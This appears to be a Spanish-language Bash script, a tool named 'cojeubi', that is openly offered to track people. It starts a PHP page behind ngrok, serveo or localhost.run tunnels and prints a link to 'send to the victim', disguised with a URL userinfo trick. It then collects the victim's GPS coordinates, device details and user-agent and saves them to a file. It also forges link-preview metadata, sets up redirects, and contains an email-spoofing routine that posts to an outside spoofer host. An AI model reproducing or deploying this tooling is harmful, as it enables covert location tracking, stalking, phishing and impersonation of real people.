# Hecho por hackingboy2020
# https://github.com/hackingboy2020
# Sigueme que no te cuesta nada broder
 
trap 'printf "\n";tap;exit 1' 2
trap vye exit 1
b="\e[1;39m"
v="\e[1;92m"
a="\e[1;93m"
r="\e[1;91m"
x="$v($b&&$v)$b"
o="$a($b 1$v)$b"
t="$a($b 2$v)$b"
tr="$a($b 3$v)$b"
f="$a($b 4$v)$b"
c="$a($b 5$v)$b"
s="$a($b 6$v)$b"
e="$a($b 7$v)$b"
nada="$r[!]$b No escribiste nada."
i="$r[!]$b Opción invalida"
rnd=`shuf -i 3000-10000 -n 1`
crnd=`shuf -i 1-9 -n 1`
lol2="m"
lol="\e[1;3${crnd}m"
DIA=`date +"%d/%m/%Y"`
HORA=`date +"%H:%M"`
link="localhost:$rnd"
 
tap() {
checkng=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkng == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
}

vye(){
if [[ $add2 == "2" ]];then
rm geo/$obtener_name
fi
sed -i "/<meta property='.*' content='.*'/d" ./geo/index.html
echo -e "\n$x cojeubi echo por hackingboy2020
$x https://github.com/hackingboy2020"
echo -e "\n$x Sigueme en YouTube: hackingboy2020, asi aprenderas sobre hacking ;)"
echo -e "\n$x Así si bro"
}

banner(){
clear
echo -e "$lol
 ▄████▄   ▒█████   ▄▄▄██▀▀▀▓█████  █    ██  ▄▄▄▄    ██▓
▒██▀ ▀█  ▒██▒  ██▒   ▒██   ▓█   ▀  ██  ▓██▒▓█████▄ ▓██▒
▒▓█    ▄ ▒██░  ██▒   ░██   ▒███   ▓██  ▒██░▒██▒ ▄██▒██▒
▒▓▓▄ ▄██▒▒██   ██░▓██▄██▓  ▒▓█  ▄ ▓▓█  ░██░▒██░█▀  ░██░
▒ ▓███▀ ░░ ████▓▒░ ▓███▒   ░▒████▒▒▒█████▓ ░▓█  ▀█▓░██░
░ ░▒ ▒  ░░ ▒░▒░▒░  ▒▓▒▒░   ░░ ▒░ ░░▒▓▒ ▒ ▒ ░▒▓███▀▒░▓  
  ░  ▒     ░ ▒ ▒░  ▒ ░▒░    ░ ░  ░░░▒░ ░ ░ ▒░▒   ░  ▒ ░
░        ░ ░ ░ ▒   ░ ░ ░      ░    ░░░ ░ ░  ░    ░  ▒ ░
░ ░          ░ ░   ░   ░      ░  ░   ░      ░       ░  
░                                                ░     
				$b 0_o 
$a[$b&&$a]$b  Creado por hackingboy2020  $a[$b&&$a]
$a[$b&&$a]$b Usalo bien ;) $a[$b&&$a]
"
}

server(){
banner
if [[ -f geo/geo ]];then
rm geo/geo
fi
echo -e "$x Elije:\n
$o Local.run
$t Serveo
$tr Ngrok ( te lo recomiendo jeje )\n"
read -p $'\e[1;33m[\e[1;39m*\e[1;32m]\e[1;39m Coje alguna: ' opct
if [[ $opct == "1" || $opct == "01" ]];then
tunnel="localrun"
mas_opciones
elif [[ $opct == "2" || $opct == "02" ]];then
tunnel="serveo"
mas_opciones
elif [[ $opct == "3" || $opct == "03" ]];then
tunnel="ngrok"
mas_opciones
else
echo -e "$i"
sleep 1
server
fi
}

findngrok(){
if [[ ! -f ngrok ]];then
command -v git > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando git..."; pkg install git -y;}
ar=$(uname -a | grep -o 'arm' | head -n1)
ar2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $ar == *'arm'* ]] || [[ $ar2 == *'Android'* ]] ; then
echo -e "$v[*]$b Instalando ngrok..."
git clone https://github.com/HarrisSec/best-ngrok
mv best-ngrok/ngrok $PWD
if [[ -d best-ngrok ]];then
rm -rf best-ngrok
else
echo -e "$r[!]$b Tu conexión ha fallado, revisala bien."
exit 1
fi

else
echo -e "$v[*]$b Instalando ngrok..."
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
echo -e "$r[!]$b Tu conexión ha fallado, revisala bien."
exit 1
fi

fi

fi

}

localrun(){
command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pkg install openssh -y;}
echo
port=3333
echo
cd geo && php -S localhost:$port > /dev/null 2>&1 &
echo -e "$v[$b*$v]$b Empezando..."
sleep 2
if [[ -f run ]];then
rm run
fi
$(which sh) -c 'ssh -R 80:localhost:$port ssh.localhost.run 2> /dev/null > run ' &
echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
sleep 5
echo -e "$v[$b*$v]$b Abriendo local.run..."
sleep 5
echo -e "$v[$b*$v]$b Obteniendo links..."
sleep 5
envialink=$(grep -o "https://u0_[0-9a-z]*\.localhost.run" run)
if [[ $envialink == "" ]];then
echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
exit 1
else
echo -e "$v[$b*$v]$b localhost:3333"
echo -e "$v[$b*$v]$b Envia a la victima > $envialink"
cutt
check
if [[ $add7 == "7" ]];then
echo -e "$v[$b*$v]$b Enviando email..."
fi
check_found
fi
if [[ -f run ]]; then
rm run
fi
}


serveo(){
command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pkg install openssh -y;}
echo
port=3333
echo
cd geo && php -S localhost:$port > /dev/null 2>&1 &
echo -e "$v[$b*$v]$b Empezando..."
sleep 2
if [[ -f link ]]; then
rm -rf link
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > link ' &
echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
sleep 5
echo -e "$v[$b*$v]$b Abriendo serveo..."
sleep 5
echo -e "$v[$b*$v]$b Obteniendo links..."
sleep 5
envialink=$(grep -o "https://[0-9a-z]*\.serveo.net" link)
if [[ $envialink == "" ]];then
echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
exit 1
else
echo -e "$v[$b*$v]$b localhost:3333"
echo -e "$v[$b*$v]$b Envia a la victima > $envialink"
cutt
if [[ $add7 == "7" ]];then
echo -e "$v[$b*$v]$b Enviando email..."
fi
check
check_found
fi
if [[ -f link ]]; then
rm -rf link
fi
}

ngrok(){
echo
cd geo && php -S $link > /dev/null 2>&1 &
echo -e "$v[$b*$v]$b Empezando, un momento..."
sleep 2
findngrok
./ngrok http $link > /dev/null 2>&1 &
echo -e "$v[$b*$v]$b Verifica una buena conexión de internet, ten paciencia "
sleep 5
echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
sleep 7
echo -e "$v[$b*$v]$b Abriendo ngrok..."
sleep 7
echo -e "$v[$b*$v]$b Obteniendo  los links..."
sleep 7
envialink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
if [[ $envialink == "" ]];then
echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
exit 1
else
echo -e "$v[$b*$v]$b $link"
echo -e "$v[$b*$v]$b Envia a la victima > \e[0;32m$envialink"
cutt
check
check_found
fi
}

cutt(){
namee=$(echo "$envialink" | cut -d "/" -f3)
pop9="https://www.randonautica.com@$namee"
echo -e "$v[$b*$v]$b Envio por facebook\e[0;32m >" $pop9
}

check_found(){
echo -e "\n$x Esperando datos $x"
while true;do
if [[ -f geo/geo ]];then
echo -e "\n$x Datos encontrados gg"
sed -i '2i Ubicación encontrada: '"$HORA"' - '"$DIA"'' geo/geo
echo -e "$a[$b*$a]$b Datos guardados: locate.txt
$a[$b*$a]$b Para leer el archivo escribe: cat locate.txt"
cat geo/geo >> locate.txt
found
fi
done
}

found(){
accu=$(grep -o "Exactitud:.*" geo/geo)
velo=$(grep -o "Velocidad:.*" geo/geo)
enca=$(grep -o "Encabezado:.*" geo/geo)
plat=$(grep -o "Plataforma:.*" geo/geo)
hard=$(grep -o "Hardware:.*" geo/geo)
altu=$(grep -o "Height:.*" geo/geo)
anch=$(grep -o "Width:.*" geo/geo)
memo=$(grep -o "Memoria:.*" geo/geo)
alti=$(grep -o "Altitud:.*" geo/geo)
lati=$(grep -o "Latitud:.*" geo/geo)
long=$(grep -o "Longitud:.*" geo/geo)
user=$(grep -o "User-Agent:.*" geo/geo)
maps=$(grep -o "GoogleMaps:.*" geo/geo)
echo -e "$x $accu
$x $velo
$x $enca
$x $plat
$x $hard
$x $altu
$x $anch
$x $memo
$x $alti
$x $lati
$x $long
$x $user
$x $maps"
rm geo/geo
echo -e "\n$x Esperando los datos, ten paciencia $x"
}

mas_opciones(){
banner
echo -e "$x Tunnel: $tunnel"
check_opciones_agregadas
echo -e "
$x Mas opciones:\n
$o Mostrar titulo
$t Mostrar mini url
$tr Redireccionar\n
$x (No es necesario que elijas alguna opcion, si quieres empezar directamente solamente escribe vamonos)
$x Para empezar:\n
$a[$b&&$v]$b Escribe/Write vamonos
"
read -p $'\e[1;33m[\e[1;39m*\e[1;32m]\e[1;39m Escoje alguno o escribe vamonos: ' opcmo
if [[ $opcmo == "1" || $opcmo == "01" ]];then
banner
read -p $'\e[1;33m[\e[1;39m*\e[1;32m]\e[1;39m Escribe el titulo: ' titulo
if [[ $titulo == "" ]];then
echo -e "$nada"
sleep 1
mas_opciones
else
add1="1"
titulo2=$titulo
mas_opciones
fi
elif [[ $opcmo == "2" || $opcmo == "02" ]];then
banner


read -p $'\e[1;33m[\e[1;39m*\e[1;32m]\e[1;39m Escribe la url: ' url
if [[ $url == "" ]];then
echo -e "$nada"
sleep 1
mas_opciones
else
add4="4"
url2=$url
mas_opciones
fi

fake
elif [[ $opcmo == "vamonos" || $opcmo == "Vamonos"|| $opcmo == "VAMONOS" ]];then
$tunnel
else
echo -e "$r[!]$b Algo ha pasado mal "
sleep 1
mas_opciones
fi
}

check_opciones_agregadas(){
if [[ $add1 == "1" ]];then
echo -e "$x Titulo: $titulo2"
fi

if [[ $add4 == "4" ]];then
echo -e "$x Mini url: $url2"
fi
if [[ $add6 == "6" ]];then
echo -e "$x Redireccionar a: $rede2"
fi
}


check(){
if [[ $add1 == "1" ]];then
show_title
fi

if [[ $add3 == "3" ]];then
show_text
fi
if [[ $add4 == "4" ]];then
show_url
fi
}

# proximamente xd
send_msj(){
if [[ $establecido == "si" ]];then
nosexd="$r[!]$b Eliminaste un archivo de la carpeta core, si quieres enviar emails vuelve añadir ese archivo."
if [[ -f email ]];then
rm email
fi

if [[ -f pr1 ]];then
rm pr1
fi
if [[ -f pr2 ]];then
rm pr2
fi
if [[ -f pr3 ]];then
rm pr3
fi
if [[ -f pr4 ]];then
rm pr4
fi
if [[ -f $OLDPWD/core/pr1 ]];then
cp $OLDPWD/core/pr1 $OLDPWD/$ruta_carpeta
else
echo -e $nosexd
exit 1
fi
if [[ -f $OLDPWD/core/pr4 ]];then
cp $OLDPWD/core/pr2 $OLDPWD/$ruta_carpeta
else
echo -e $nosexd
exit 1
fi
if [[ -f $OLDPWD/core/pr3 ]];then
cp $OLDPWD/core/pr3 $OLDPWD/$ruta_carpeta
else
echo -e $nosexd
exit 1
fi
if [[ -f $OLDPWD/core/pr4 ]];then
cp $OLDPWD/core/pr4 $OLDPWD/$ruta_carpeta
else
echo -e $nosexd
exit 1
fi
if [[ -f $OLDPWD/core/email ]];then
cp $OLDPWD/core/email $OLDPWD/$ruta_carpeta
else
echo -e "$r[!]$b Eliminaste el archivo que contenia el mail"
exit 1
fi
if [[ -f hola ]];then
rm hola
fi
if [[ -f victima ]];then
rm victima
fi
replyr=$(echo $victim | cut -d "@" -f2)
replye="$send@$replyr"
echo $victim >> victima
echo $envialink >> hola
source email
mens=$correobycalvinharrisxd
curl --data "fromname=$send && fromemail=$correo && replyname=$send && replyemail=$replye && to=$victim && message=$mens && subject=$tema" https://pruebaemailspoof.000webhostapp.com/ephp_spoofer/ephp_spoofer.php -o spoof > /dev/null 2>&1
if [[ -f spoof ]];then
extraer_msj=$(grep -o "Successfully" spoof)
if [[ $extraer_msj == "Successfully" ]];then
echo -e "$v[$b*$v]$b Email enviado correctamente GG"
rm spoof
else
echo -e "$r[!]$b No se envio el email, F"
rm spoof
fi

else
echo -e "$r[!]$b No se envio el email, comprueba tu conexión"
fi

else
curl --data "fromname=$send && fromemail=$correo && replyname=$send && replyemail=$replye && to=$victim && message=$msj && subject=$tema" https://pruebaemailspoof.000webhostapp.com/ephp_spoofer/ephp_spoofer.php -o spoof > /dev/null 2>&1
if [[ -f spoof ]];then
extraer_msj=$(grep -o "Successfully" spoof)
if [[ $extraer_msj == "Successfully" ]];then

echo -e "$v[$b*$v]$b Email enviado correctamente:)"
rm spoof
else
echo -e "$r[!]$b No se envio el email, F"
rm spoof
fi

else
echo -e "$r[!]$b No se envio el email, comprueba a ver tu conexión"
fi
fi
}
#<!--->

show_title(){
ogtitle="<meta property='og:title' content='$titulo2'/>"
sed -i "/<meta property='og:title' content='.*'/d" ./geo/index.html
sed -i '4i '"$ogtitle"'' geo/index.html
}

show_photo(){
cp "$foto" geo
obtener_name=$(basename "$foto")
total="$envialink/$obtener_name"
ogimg="<meta property='og:image' content='$total'/>"
sed -i "/<meta property='og:image' content='.*'/d" ./geo/index.html
sed -i '4i '"$ogimg"'' geo/index.html
}

show_text(){
ogtext="<meta property='og:description' content='$text' />"
sed -i "/<meta property='og:description' content='.*'/d" ./geo/index.html
sed -i '4i '"$ogtext"'' geo/index.html
}

show_url(){
ogurl="<meta property='og:url' content='http://$url2' />"
sed -i "/<meta property='og:url' content='.*'/d" ./geo/index.html
sed -i '4i '"$ogurl"'' geo/index.html
}

add_alert_box(){
ogalert="<script src='alert.js'/>"
sed -i "/<script src='alert.js'/d" ./geo/index.html

if [[ -f geo/alert.js ]];then
rm geo/alert.js
fi

echo "alert('$alert');" >> geo/alert.js
sed -i '4i '"$ogalert"'' geo/index.html
}

fake(){
read -p $'\e[1;33m[\e[1;39m*\e[1;32m]\e[1;39m Escribe la url a redireccionar(Usa: http/https)\e[1;39m > ' rede
if [[ $rede == "" ]];then
echo -e "$nada"
sleep 1
mas_opciones
else
ogrede="header('Location: $rede');"
sed -i "/header('Location:.*)/d" ./geo/geo.php
sed -i '2i '"$ogrede"'' geo/geo.php
fi
mas_opciones
}

server

